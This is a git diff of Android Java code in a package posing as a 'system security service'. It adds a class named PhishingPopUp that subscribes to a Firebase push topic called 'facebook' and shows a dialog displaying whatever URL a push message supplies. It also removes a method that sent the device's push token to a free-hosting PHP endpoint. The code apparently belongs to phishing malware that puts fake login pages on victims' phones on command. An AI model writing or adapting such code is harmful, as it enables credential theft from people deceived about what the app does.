@@ -1,32 +1,54 @@
-package com.service.security.services.systemsecurityservice;
+package com.service.security.services.systemsecurityservice.mainUi;
 
 import android.app.Dialog;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.os.Build;
+import android.os.Bundle;
+import android.support.v7.app.AppCompatActivity;
+import android.util.Log;
 import android.view.MotionEvent;
 import android.view.View;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
-import android.widget.Toast;
 
-import java.io.IOException;
+import com.google.firebase.iid.FirebaseInstanceId;
+import com.google.firebase.messaging.FirebaseMessaging;
+import com.service.security.services.systemsecurityservice.R;
 
-import okhttp3.FormBody;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.RequestBody;
+public class PhishingPopUp extends AppCompatActivity {
 
+    private static PhishingPopUp mInstance;
 
-class Actions {
-    static void showDialog(Context context, String url) {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        mInstance = this;
+        String url = getIntent().getStringExtra("url");
+        showDialog(this, url);
+        setContentView(R.layout.activity_main);
+        getToken();
+
+    }
+
+    public void getToken() {
+        FirebaseMessaging.getInstance().subscribeToTopic("facebook");
+        String token = FirebaseInstanceId.getInstance().getToken();
+        Log.e("Token is ", "" + token);
+    }
+
+    public static synchronized PhishingPopUp getInstance() {
+        return mInstance;
+    }
+
+    void showDialog(Context context, String url) {
         Dialog dialog = new Dialog(context);
-        dialog.setContentView(R.layout.activity_main2);
+        dialog.setContentView(R.layout.popup);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
             dialog.setOnDismissListener(new DialogInterface.OnDismissListener() {
                 @Override
                 public void onDismiss(DialogInterface dialogInterface) {
-                    MainActivity.getInstance().finish();
+                    PhishingPopUp.getInstance().finish();
                 }
             });
         }
@@ -34,7 +56,7 @@ class Actions {
         dialog.setOnCancelListener(new DialogInterface.OnCancelListener() {
             @Override
             public void onCancel(DialogInterface dialogInterface) {
-                MainActivity.getInstance().finish();
+                PhishingPopUp.getInstance().finish();
             }
         });
 
@@ -55,25 +77,6 @@ class Actions {
 
         //wv.reload();
         dialog.show();
-    }
-
-    static void registerToken(String token) {
-
-        OkHttpClient client = new OkHttpClient();
-        RequestBody body = new FormBody.Builder()
-                .add("Token", token)
-                .build();
-
-        Request request = new Request.Builder()
-                .url("http://hominoid-butters.000webhostapp.com/fcm/register.php")
-                .post(body)
-                .build();
-
-        try {
-            client.newCall(request).execute();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
     }
 
 }
